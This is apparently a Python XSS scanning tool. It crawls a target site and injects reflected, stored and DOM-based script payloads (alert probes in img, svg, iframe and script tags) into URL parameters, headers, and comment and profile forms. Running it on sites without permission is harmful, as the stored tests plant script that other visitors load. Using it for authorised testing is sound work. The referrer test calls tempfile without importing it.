#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import time
import os
import json
import re
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import selenium
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import string

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("xss_attacks.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("XSSAttacks")

class XSSAttacker:
    """Implementation of various XSS attack techniques for security testing"""
    
    def __init__(self, target_url, output_dir="security_tests"):
        self.target_url = target_url
        self.output_dir = output_dir
        self.results = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": target_url,
            "reflected_xss": {},
            "stored_xss": {},
            "dom_xss": {}
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.browser = None
    
    def setup_browser(self):
        """Setup headless browser for DOM testing"""
        try:
            options = Options()
            options.headless = True
            options.add_argument("--disable-gpu")
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--no-sandbox")
            
            self.browser = webdriver.Firefox(options=options)
            logger.info("Browser setup successful")
            return True
        except Exception as e:
            logger.error(f"Browser setup failed: {str(e)}")
            return False
    
    def close_browser(self):
        """Close headless browser"""
        if self.browser:
            try:
                self.browser.quit()
                logger.info("Browser closed successfully")
            except Exception as e:
                logger.error(f"Error closing browser: {str(e)}")
    
    def find_injection_points(self, url=None):
        """Find potential XSS injection points from a URL"""
        if url is None:
            url = self.target_url
            
        injection_points = []
        try:
            # Get initial page
            response = requests.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            for form in forms:
                form_method = form.get('method', 'get').lower()
                form_action = form.get('action', '')
                form_url = urljoin(url, form_action) if form_action else url
                
                # Find input fields
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    input_name = input_field.get('name', '')
                    input_type = input_field.get('type', '').lower()
                    
                    if input_name and input_type not in ['hidden', 'submit', 'button', 'image', 'file', 'checkbox', 'radio']:
                        injection_points.append({
                            'url': form_url,
                            'method': form_method,
                            'param_name': input_name,
                            'source': 'form',
                            'context': 'body'
                        })
            
            # Find all links with query parameters
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    link_url = urljoin(url, href)
                    parsed_url = urlparse(link_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    for param_name in query_params:
                        injection_points.append({
                            'url': link_url,
                            'method': 'get',
                            'param_name': param_name,
                            'source': 'link',
                            'context': 'url'
                        })
                        
            # Find custom event handlers (for DOM XSS testing)
            event_elements = []
            for event in ['onclick', 'onmouseover', 'onload', 'onerror', 'onkeyup', 'onchange']:
                event_elements.extend(soup.select(f'[{event}]'))
                
            for element in event_elements:
                for attr in element.attrs:
                    if attr.startswith('on'):
                        injection_points.append({
                            'url': url,
                            'method': 'get',
                            'param_name': None,
                            'source': 'event',
                            'event': attr,
                            'context': 'dom'
                        })
                        
            # Look for potential URL fragments (for DOM XSS)
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string and any(x in script.string.lower() for x in ['location.hash', 'document.url', 'window.location']):
                    injection_points.append({
                        'url': url,
                        'method': 'fragment',
                        'param_name': None,
                        'source': 'javascript',
                        'context': 'dom'
                    })
            
            logger.info(f"Found {len(injection_points)} potential XSS injection points")
            
        except Exception as e:
            logger.error(f"Error finding XSS injection points: {str(e)}")
            
        return injection_points
    
    def generate_test_value(self, length=8):
        """Generate a random test value for identifying reflection points"""
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    #==========================================
    # Reflected XSS Testing Methods
    #==========================================
    
    def test_url_parameter_xss(self, injection_points):
        """Test for reflected XSS in URL parameters"""
        logger.info("Testing for Reflected XSS in URL parameters")
        
        # XSS payloads to test
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "\"><script>alert(1)</script>",
            "';alert(1);//"
        ]
        
        vulnerabilities = []
        
        # Filter for URL parameter injection points
        url_params = [p for p in injection_points if p['context'] == 'url' or p['method'] == 'get']
        
        for point in url_params:
            url = point['url']
            method = point['method']
            param_name = point['param_name']
            
            # First use a random test value to check if parameter is reflected
            test_value = self.generate_test_value()
            try:
                test_response = requests.get(
                    url,
                    params={param_name: test_value},
                    headers=self.headers,
                    timeout=10
                )
                
                # Check if test value is reflected in the response
                if test_value in test_response.text:
                    # Parameter is reflected, now test XSS payloads
                    for payload in xss_payloads:
                        try:
                            xss_response = requests.get(
                                url,
                                params={param_name: payload},
                                headers=self.headers,
                                timeout=10
                            )
                            
                            # Check if payload appears unencoded in the response
                            if payload in xss_response.text:
                                # Found potential XSS
                                vulnerabilities.append({
                                    'type': 'Reflected XSS',
                                    'url': url,
                                    'method': 'GET',
                                    'param': param_name,
                                    'payload': payload,
                                    'evidence': 'Payload reflected unencoded in response',
                                    'context': 'URL parameter'
                                })
                                break  # Found vulnerability, no need to try other payloads
                                
                        except Exception as e:
                            logger.error(f"Error testing XSS payload in {url}, param {param_name}: {str(e)}")
                            
            except Exception as e:
                logger.error(f"Error testing reflection in {url}, param {param_name}: {str(e)}")
        
        return vulnerabilities
    
    def test_form_input_xss(self, injection_points):
        """Test for reflected XSS in form inputs"""
        logger.info("Testing for Reflected XSS in form inputs")
        
        # XSS payloads to test
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "\"><script>alert(1)</script>",
            "';alert(1);//"
        ]
        
        vulnerabilities = []
        
        # Filter for form input injection points
        form_inputs = [p for p in injection_points if p['source'] == 'form']
        
        for point in form_inputs:
            url = point['url']
            method = point['method']
            param_name = point['param_name']
            
            # First use a random test value to check if parameter is reflected
            test_value = self.generate_test_value()
            try:
                if method == 'get':
                    test_response = requests.get(
                        url,
                        params={param_name: test_value},
                        headers=self.headers,
                        timeout=10
                    )
                else:  # POST
                    test_response = requests.post(
                        url,
                        data={param_name: test_value},
                        headers=self.headers,
                        timeout=10
                    )
                
                # Check if test value is reflected in the response
                if test_value in test_response.text:
                    # Parameter is reflected, now test XSS payloads
                    for payload in xss_payloads:
                        try:
                            if method == 'get':
                                xss_response = requests.get(
                                    url,
                                    params={param_name: payload},
                                    headers=self.headers,
                                    timeout=10
                                )
                            else:  # POST
                                xss_response = requests.post(
                                    url,
                                    data={param_name: payload},
                                    headers=self.headers,
                                    timeout=10
                                )
                            
                            # Check if payload appears unencoded in the response
                            if payload in xss_response.text:
                                # Found potential XSS
                                vulnerabilities.append({
                                    'type': 'Reflected XSS',
                                    'url': url,
                                    'method': method.upper(),
                                    'param': param_name,
                                    'payload': payload,
                                    'evidence': 'Payload reflected unencoded in response',
                                    'context': 'Form input'
                                })
                                break  # Found vulnerability, no need to try other payloads
                                
                        except Exception as e:
                            logger.error(f"Error testing XSS payload in {url}, param {param_name}: {str(e)}")
                            
            except Exception as e:
                logger.error(f"Error testing reflection in {url}, param {param_name}: {str(e)}")
        
        return vulnerabilities
    
    def test_http_header_xss(self):
        """Test for reflected XSS in HTTP headers"""
        logger.info("Testing for Reflected XSS in HTTP headers")
        
        # XSS payloads to test in headers
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>"
        ]
        
        # Headers to test
        test_headers = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'Cookie'
        ]
        
        vulnerabilities = []
        
        for header_name in test_headers:
            # First use a random test value to check if header is reflected
            test_value = self.generate_test_value()
            custom_headers = self.headers.copy()
            custom_headers[header_name] = test_value
            
            try:
                test_response = requests.get(
                    self.target_url,
                    headers=custom_headers,
                    timeout=10
                )
                
                # Check if test value is reflected in the response
                if test_value in test_response.text:
                    # Header is reflected, now test XSS payloads
                    for payload in xss_payloads:
                        try:
                            custom_headers[header_name] = payload
                            xss_response = requests.get(
                                self.target_url,
                                headers=custom_headers,
                                timeout=10
                            )
                            
                            # Check if payload appears unencoded in the response
                            if payload in xss_response.text:
                                # Found potential XSS
                                vulnerabilities.append({
                                    'type': 'Reflected XSS',
                                    'url': self.target_url,
                                    'method': 'GET',
                                    'param': header_name,
                                    'payload': payload,
                                    'evidence': 'Payload reflected unencoded from HTTP header',
                                    'context': 'HTTP Header'
                                })
                                break  # Found vulnerability, no need to try other payloads
                                
                        except Exception as e:
                            logger.error(f"Error testing XSS payload in header {header_name}: {str(e)}")
                            
            except Exception as e:
                logger.error(f"Error testing reflection in header {header_name}: {str(e)}")
        
        return vulnerabilities
    
    #==========================================
    # Stored XSS Testing Methods
    #==========================================
    
    def find_storage_points(self):
        """Find potential storage points for stored XSS testing"""
        logger.info("Finding potential storage points for Stored XSS")
        
        storage_points = []
        
        try:
            # Get initial page
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms that might be used for storing data
            forms = soup.find_all('form')
            for form in forms:
                form_method = form.get('method', '').lower()
                form_action = form.get('action', '')
                form_url = urljoin(self.target_url, form_action) if form_action else self.target_url
                
                # Only interested in POST forms for storage
                if form_method == 'post':
                    # Find textarea elements (likely for comments, etc.)
                    textareas = form.find_all('textarea')
                    for textarea in textareas:
                        textarea_name = textarea.get('name', '')
                        if textarea_name:
                            storage_points.append({
                                'url': form_url,
                                'method': form_method,
                                'param_name': textarea_name,
                                'source': 'form',
                                'context': 'textarea',
                                'form_data': self._extract_form_data(form)
                            })
                    
                    # Find input fields that might contain user content
                    inputs = form.find_all('input')
                    for input_field in inputs:
                        input_name = input_field.get('name', '')
                        input_type = input_field.get('type', '').lower()
                        
                        # Look for text/content types
                        if input_name and input_type in ['text', 'search', 'email', 'url', 'tel', '']:
                            storage_points.append({
                                'url': form_url,
                                'method': form_method,
                                'param_name': input_name,
                                'source': 'form',
                                'context': f'input-{input_type}',
                                'form_data': self._extract_form_data(form)
                            })
            
            # Look for upload forms
            upload_forms = soup.find_all('form', enctype="multipart/form-data")
            for form in upload_forms:
                form_method = form.get('method', '').lower()
                form_action = form.get('action', '')
                form_url = urljoin(self.target_url, form_action) if form_action else self.target_url
                
                file_inputs = form.find_all('input', type="file")
                for file_input in file_inputs:
                    file_name = file_input.get('name', '')
                    if file_name:
                        storage_points.append({
                            'url': form_url,
                            'method': form_method,
                            'param_name': file_name,
                            'source': 'form',
                            'context': 'file-upload',
                            'form_data': self._extract_form_data(form)
                        })
                        
            logger.info(f"Found {len(storage_points)} potential storage points for Stored XSS")
            
        except Exception as e:
            logger.error(f"Error finding storage points: {str(e)}")
            
        return storage_points
    
    def _extract_form_data(self, form):
        """Extract all form data for submission"""
        form_data = {}
        
        # Get all input fields
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_field in inputs:
            name = input_field.get('name', '')
            if name:
                # For different input types, get appropriate value
                field_type = input_field.get('type', '').lower()
                
                if field_type in ['checkbox', 'radio']:
                    if input_field.get('checked'):
                        form_data[name] = input_field.get('value', 'on')
                elif field_type == 'file':
                    # Skip file inputs, we'll handle them separately
                    pass
                else:
                    # For text, hidden, etc.
                    form_data[name] = input_field.get('value', '')
        
        # Get select options
        selects = form.find_all('select')
        for select in selects:
            name = select.get('name', '')
            if name:
                # Find selected option
                selected = select.find('option', selected=True)
                if selected:
                    form_data[name] = selected.get('value', '')
                else:
                    # If no option selected, get first option
                    first_option = select.find('option')
                    if first_option:
                        form_data[name] = first_option.get('value', '')
        
        return form_data
    
    def test_comment_xss(self, storage_points):
        """Test for stored XSS in comment-like fields"""
        logger.info("Testing for Stored XSS in comments")
        
        # XSS payloads to test
        xss_payloads = [
            "<script>alert('stored-xss-test')</script>",
            "<img src=x onerror=alert('stored-xss-test')>",
            "<svg/onload=alert('stored-xss-test')>",
            "<iframe src=\"javascript:alert('stored-xss-test')\"></iframe>"
        ]
        
        vulnerabilities = []
        
        # Filter for textarea contexts
        comment_fields = [p for p in storage_points if p['context'] == 'textarea']
        
        for point in comment_fields:
            url = point['url']
            method = point['method']
            param_name = point['param_name']
            form_data = point['form_data'].copy()
            
            # Try each payload
            for payload in xss_payloads:
                try:
                    # Prepare form data with XSS payload
                    form_data[param_name] = payload
                    
                    # Submit the comment/data
                    response = requests.post(
                        url,
                        data=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                    
                    # Check response status to see if submission was successful
                    if response.status_code < 400:  # Any success or redirect
                        # Visit the page again to check if stored XSS is triggered
                        # Try both the target URL and the response URL (in case of redirects)
                        urls_to_check = [self.target_url]
                        if response.url != url:
                            urls_to_check.append(response.url)
                            
                        for check_url in urls_to_check:
                            check_response = requests.get(check_url, headers=self.headers, timeout=10)
                            
                            # Check if payload appears unencoded in the response
                            if payload in check_response.text:
                                # Found potential stored XSS
                                vulnerabilities.append({
                                    'type': 'Stored XSS',
                                    'url': url,
                                    'method': method.upper(),
                                    'param': param_name,
                                    'payload': payload,
                                    'evidence': 'Payload found unencoded in page after submission',
                                    'context': 'Comment/Textarea'
                                })
                                break  # Found vulnerability, no need to check other URLs
                                
                        if len(vulnerabilities) > 0 and vulnerabilities[-1]['payload'] == payload:
                            break  # Found vulnerability, no need to try other payloads
                    
                except Exception as e:
                    logger.error(f"Error testing Stored XSS in {url}, param {param_name}: {str(e)}")
        
        return vulnerabilities
    
    def test_profile_xss(self, storage_points):
        """Test for stored XSS in profile-like fields"""
        logger.info("Testing for Stored XSS in profile fields")
        
        # XSS payloads to test
        xss_payloads = [
            "<script>alert('stored-profile-xss')</script>",
            "<img src=x onerror=alert('stored-profile-xss')>",
            "<svg/onload=alert('stored-profile-xss')>"
        ]
        
        vulnerabilities = []
        
        # Filter for text input contexts
        profile_fields = [p for p in storage_points if p['context'].startswith('input-')]
        
        for point in profile_fields:
            url = point['url']
            method = point['method']
            param_name = point['param_name']
            form_data = point['form_data'].copy()
            
            # Try each payload
            for payload in xss_payloads:
                try:
                    # Prepare form data with XSS payload
                    form_data[param_name] = payload
                    
                    # Submit the profile/data
                    response = requests.post(
                        url,
                        data=form_data,
                        headers=self.headers,
                        timeout=10
                    )
                    
                    # Check response status to see if submission was successful
                    if response.status_code < 400:  # Any success or redirect
                        # Visit the page again to check if stored XSS is triggered
                        # Try both the target URL and the response URL (in case of redirects)
                        urls_to_check = [self.target_url]
                        if response.url != url:
                            urls_to_check.append(response.url)
                            
                        for check_url in urls_to_check:
                            check_response = requests.get(check_url, headers=self.headers, timeout=10)
                            
                            # Check if payload appears unencoded in the response
                            if payload in check_response.text:
                                # Found potential stored XSS
                                vulnerabilities.append({
                                    'type': 'Stored XSS',
                                    'url': url,
                                    'method': method.upper(),
                                    'param': param_name,
                                    'payload': payload,
                                    'evidence': 'Payload found unencoded in page after submission',
                                    'context': 'Profile/Input Field'
                                })
                                break  # Found vulnerability, no need to check other URLs
                                
                        if len(vulnerabilities) > 0 and vulnerabilities[-1]['payload'] == payload:
                            break  # Found vulnerability, no need to try other payloads
                    
                except Exception as e:
                    logger.error(f"Error testing Stored XSS in {url}, param {param_name}: {str(e)}")
        
        return vulnerabilities
    
    def test_file_upload_xss(self, storage_points):
        """Test for stored XSS via file uploads"""
        logger.info("Testing for Stored XSS in file uploads")
        
        # XSS upload tests are complex and need actual browser testing 
        # This is a simplified approach
        
        vulnerabilities = []
        
        # Filter for file upload contexts
        upload_fields = [p for p in storage_points if p['context'] == 'file-upload']
        
        if not upload_fields:
            logger.info("No file upload fields found for testing")
            return vulnerabilities
            
        logger.warning("File upload XSS testing is limited in this implementation")
        logger.warning("Manual testing is recommended for thorough file upload XSS testing")
        
        # In a real-world test, you would:
        # 1. Prepare malicious SVG/HTML/XML files with XSS payloads
        # 2. Upload them via the form
        # 3. Navigate to where they're served and check if XSS executes
        
        # Here we just document the upload points for manual testing
        for point in upload_fields:
            vulnerabilities.append({
                'type': 'Potential Stored XSS',
                'url': point['url'],
                'method': point['method'].upper(),
                'param': point['param_name'],
                'payload': 'Manual testing required',
                'evidence': 'File upload field identified (requires manual testing)',
                'context': 'File Upload',
                'test_recommendation': 'Upload an SVG file containing XSS payload and check if executed when viewed'
            })
        
        return vulnerabilities
    
    #==========================================
    # DOM-based XSS Testing Methods
    #==========================================
    
    def test_location_based_dom_xss(self):
        """Test for DOM-based XSS via window.location manipulation"""
        logger.info("Testing for DOM-based XSS via location")
        
        if not self.setup_browser():
            logger.error("Browser setup failed, cannot perform DOM XSS tests")
            return []
        
        # XSS payloads to test in URL fragments
        xss_payloads = [
            "#<script>alert('dom-xss-test')</script>",
            "#<img src=x onerror=alert('dom-xss-test')>",
            "#';alert('dom-xss-test');//",
            "#\"><script>alert('dom-xss-test')</script>"
        ]
        
        vulnerabilities = []
        
        try:
            # First check the page for location usage
            self.browser.get(self.target_url)
            
            # Look for JavaScript that uses location properties
            location_script = """
            return (function() {
                var uses = [];
                if (document.scripts) {
                    for (var i = 0; i < document.scripts.length; i++) {
                        var script = document.scripts[i].text || '';
                        if (script.indexOf('location.hash') !== -1) uses.push('location.hash');
                        if (script.indexOf('location.href') !== -1) uses.push('location.href');
                        if (script.indexOf('location.search') !== -1) uses.push('location.search');
                        if (script.indexOf('document.URL') !== -1) uses.push('document.URL');
                        if (script.indexOf('document.documentURI') !== -1) uses.push('document.documentURI');
                    }
                }
                return uses;
            })();
            """
            
            location_uses = self.browser.execute_script(location_script)
            
            if not location_uses:
                logger.info("No location usage detected in scripts, trying payloads anyway")
            
            # Test URL fragment payloads
            for payload in xss_payloads:
                test_url = self.target_url + payload
                
                try:
                    # Set alert detector
                    alert_script = """
                    window.alert = function(msg) {
                        window.xssDetected = msg;
                        return true;
                    };
                    window.xssDetected = false;
                    """
                    self.browser.execute_script(alert_script)
                    
                    # Navigate to test URL
                    self.browser.get(test_url)
                    
                    # Small delay to allow possible XSS to execute
                    time.sleep(1)
                    
                    # Check if XSS was triggered
                    xss_result = self.browser.execute_script("return window.xssDetected;")
                    
                    if xss_result:
                        vulnerabilities.append({
                            'type': 'DOM-based XSS',
                            'url': test_url,
                            'method': 'GET',
                            'param': 'URL Fragment',
                            'payload': payload,
                            'evidence': f"Alert triggered with message: {xss_result}",
                            'context': 'window.location manipulation'
                        })
                        break  # Found vulnerability, no need to try other payloads
                
                except Exception as e:
                    logger.error(f"Error testing location-based DOM XSS with payload {payload}: {str(e)}")
            
        except Exception as e:
            logger.error(f"Error during DOM XSS location testing: {str(e)}")
        
        return vulnerabilities
    
    def test_document_referrer_dom_xss(self):
        """Test for DOM-based XSS via document.referrer exploitation"""
        logger.info("Testing for DOM-based XSS via document.referrer")
        
        if not self.browser:
            if not self.setup_browser():
                logger.error("Browser setup failed, cannot perform DOM XSS tests")
                return []
        
        # XSS payloads to test in referrer
        xss_payloads = [
            "<script>alert('dom-ref-xss')</script>",
            "<img src=x onerror=alert('dom-ref-xss')>",
            "javascript:alert('dom-ref-xss')//"
        ]
        
        vulnerabilities = []
        
        try:
            # First check if referrer is used in the page
            self.browser.get(self.target_url)
            
            referrer_script = """
            return (function() {
                var uses = false;
                if (document.scripts) {
                    for (var i = 0; i < document.scripts.length; i++) {
                        var script = document.scripts[i].text || '';
                        if (script.indexOf('document.referrer') !== -1) {
                            uses = true;
                            break;
                        }
                    }
                }
                return uses;
            })();
            """
            
            uses_referrer = self.browser.execute_script(referrer_script)
            
            if not uses_referrer:
                logger.info("No document.referrer usage detected, skipping referrer tests")
                return []
            
            # Create a simple HTML page with the payload in the URL
            for payload in xss_payloads:
                try:
                    # Create a temporary HTML file with a link to the target
                    with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
                        html_content = f"""
                        <html>
                        <head><title>Referrer Test</title></head>
                        <body>
                        <script>
                        window.location = "{self.target_url}?{payload}";
                        </script>
                        </body>
                        </html>
                        """
                        f.write(html_content.encode('utf-8'))
                        temp_file = f.name
                    
                    # Set alert detector on target page
                    self.browser.get(self.target_url)
                    alert_script = """
                    window.alert = function(msg) {
                        window.xssDetected = msg;
                        return true;
                    };
                    window.xssDetected = false;
                    """
                    self.browser.execute_script(alert_script)
                    
                    # Visit the temporary file which will set the referrer
                    self.browser.get('file://' + temp_file)
                    
                    # Small delay to allow possible XSS to execute
                    time.sleep(1)
                    
                    # Check if XSS was triggered
                    xss_result = self.browser.execute_script("return window.xssDetected;")
                    
                    if xss_result:
                        vulnerabilities.append({
                            'type': 'DOM-based XSS',
                            'url': self.target_url,
                            'method': 'GET',
                            'param': 'Referrer',
                            'payload': payload,
                            'evidence': f"Alert triggered with message: {xss_result}",
                            'context': 'document.referrer exploitation'
                        })
                        break  # Found vulnerability, no need to try other payloads
                    
                    # Clean up temporary file
                    os.unlink(temp_file)
                    
                except Exception as e:
                    logger.error(f"Error testing referrer-based DOM XSS with payload {payload}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error during DOM XSS referrer testing: {str(e)}")
        
        return vulnerabilities
    
    def test_javascript_events_dom_xss(self, injection_points):
        """Test for DOM-based XSS via JavaScript events"""
        logger.info("Testing for DOM-based XSS via JavaScript events")
        
        if not self.browser:
            if not self.setup_browser():
                logger.error("Browser setup failed, cannot perform DOM XSS tests")
                return []
        
        # Filter for event-based injection points
        event_points = [p for p in injection_points if p.get('source') == 'event']
        
        if not event_points:
            logger.info("No JavaScript event handlers found for testing")
            return []
        
        vulnerabilities = []
        
        # Test each event handler
        for point in event_points:
            url = point['url']
            event = point.get('event', '')
            
            try:
                # Set alert detector
                self.browser.get(url)
                alert_script = """
                window.alert = function(msg) {
                    window.xssDetected = msg || true;
                    return true;
                };
                window.xssDetected = false;
                """
                self.browser.execute_script(alert_script)
                
                # Find elements with this event
                elements = self.browser.find_elements(By.CSS_SELECTOR, f'[{event}]')
                
                for i, element in enumerate(elements):
                    try:
                        # Try to trigger the event
                        if event == 'onclick':
                            element.click()
                        elif event == 'onmouseover':
                            webdriver.ActionChains(self.browser).move_to_element(element).perform()
                        elif event == 'onfocus':
                            element.click()
                        elif event == 'onkeyup' or event == 'onkeydown':
                            element.click()
                            element.send_keys('test')
                        
                        # Check if XSS was triggered
                        xss_result = self.browser.execute_script("return window.xssDetected;")
                        
                        if xss_result:
                            element_html = element.get_attribute('outerHTML')
                            vulnerabilities.append({
                                'type': 'DOM-based XSS',
                                'url': url,
                                'method': 'Event',
                                'param': event,
                                'payload': 'Event trigger',
                                'evidence': f"Alert triggered via {event} with element: {element_html}",
                                'context': 'JavaScript events'
                            })
                            break  # Found vulnerability, no need to try other elements
                    
                    except Exception as e:
                        logger.error(f"Error triggering event {event} on element {i}: {str(e)}")
                
            except Exception as e:
                logger.error(f"Error testing JavaScript events DOM XSS on {url}: {str(e)}")
        
        return vulnerabilities
    
    #==========================================
    # Main Testing Methods
    #==========================================
    
    def run_reflected_xss_tests(self):
        """Run all reflected XSS tests"""
        logger.info("Starting Reflected XSS tests")
        
        # First find injection points
        injection_points = self.find_injection_points()
        
        if not injection_points:
            logger.warning("No injection points found for Reflected XSS testing")
            self.results["reflected_xss"] = {
                "vulnerable": False,
                "message": "No injection points found"
            }
            return self.results["reflected_xss"]
        
        # Run all tests
        url_param_results = self.test_url_parameter_xss(injection_points)
        form_input_results = self.test_form_input_xss(injection_points)
        http_header_results = self.test_http_header_xss()
        
        # Combine results
        all_vulnerabilities = url_param_results + form_input_results + http_header_results
        
        # Create result object
        self.results["reflected_xss"] = {
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerabilities_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "url_parameters": url_param_results,
            "form_inputs": form_input_results,
            "http_headers": http_header_results
        }
        
        return self.results["reflected_xss"]
    
    def run_stored_xss_tests(self):
        """Run all stored XSS tests"""
        logger.info("Starting Stored XSS tests")
        
        # Find storage points
        storage_points = self.find_storage_points()
        
        if not storage_points:
            logger.warning("No storage points found for Stored XSS testing")
            self.results["stored_xss"] = {
                "vulnerable": False,
                "message": "No storage points found"
            }
            return self.results["stored_xss"]
        
        # Run all tests
        comment_results = self.test_comment_xss(storage_points)
        profile_results = self.test_profile_xss(storage_points)
        file_upload_results = self.test_file_upload_xss(storage_points)
        
        # Combine results
        all_vulnerabilities = comment_results + profile_results + file_upload_results
        
        # Create result object
        self.results["stored_xss"] = {
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerabilities_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "comments": comment_results,
            "profiles": profile_results,
            "file_uploads": file_upload_results
        }
        
        return self.results["stored_xss"]
    
    def run_dom_xss_tests(self):
        """Run all DOM-based XSS tests"""
        logger.info("Starting DOM-based XSS tests")
        
        # First find injection points
        injection_points = self.find_injection_points()
        
        # Run all tests
        location_results = self.test_location_based_dom_xss()
        referrer_results = self.test_document_referrer_dom_xss()
        events_results = self.test_javascript_events_dom_xss(injection_points)
        
        # Combine results
        all_vulnerabilities = location_results + referrer_results + events_results
        
        # Create result object
        self.results["dom_xss"] = {
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerabilities_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "location": location_results,
            "referrer": referrer_results,
            "events": events_results
        }
        
        # Clean up browser
        self.close_browser()
        
        return self.results["dom_xss"]
    
    def run_all_tests(self):
        """Run all XSS attack tests"""
        logger.info(f"Starting all XSS attack tests against {self.target_url}")
        
        # Run all test groups
        self.run_reflected_xss_tests()
        self.run_stored_xss_tests()
        self.run_dom_xss_tests()
        
        # Count total vulnerabilities
        total_vulns = 0
        if self.results["reflected_xss"].get("vulnerable", False):
            total_vulns += self.results["reflected_xss"].get("vulnerabilities_count", 0)
        if self.results["stored_xss"].get("vulnerable", False):
            total_vulns += self.results["stored_xss"].get("vulnerabilities_count", 0)
        if self.results["dom_xss"].get("vulnerable", False):
            total_vulns += self.results["dom_xss"].get("vulnerabilities_count", 0)
            
        self.results["total_vulnerabilities"] = total_vulns
        self.results["vulnerable"] = total_vulns > 0
        
        logger.info(f"XSS attack testing completed. Found {total_vulns} vulnerabilities.")
        
        return self.results
    
    def save_results(self, filename=None):
        """Save scan results to file"""
        if not filename:
            filename = os.path.join(self.output_dir, "xss_attacks_results.json")
            
        # Ensure directory exists
        os.makedirs(os.path.dirname(filename), exist_ok=True)
            
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
            
        logger.info(f"Results saved to {filename}")
        return filename

# Main function for standalone usage
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="XSS Attack Testing Tool")
    parser.add_argument("target", help="Target URL to test")
    parser.add_argument("--output", "-o", help="Output directory for results", default="security_tests")
    parser.add_argument("--reflected", action="store_true", help="Run only reflected XSS tests")
    parser.add_argument("--stored", action="store_true", help="Run only stored XSS tests")
    parser.add_argument("--dom", action="store_true", help="Run only DOM-based XSS tests")
    parser.add_argument("--all", action="store_true", help="Run all tests (default)")
    
    args = parser.parse_args()
    
    xss_attacker = XSSAttacker(args.target, args.output)
    
    try:
        if args.reflected:
            xss_attacker.run_reflected_xss_tests()
        elif args.stored:
            xss_attacker.run_stored_xss_tests()
        elif args.dom:
            xss_attacker.run_dom_xss_tests()
        else:
            # Run all by default
            xss_attacker.run_all_tests()
            
        xss_attacker.save_results()
    finally:
        xss_attacker.close_browser()

if __name__ == "__main__":
    main() 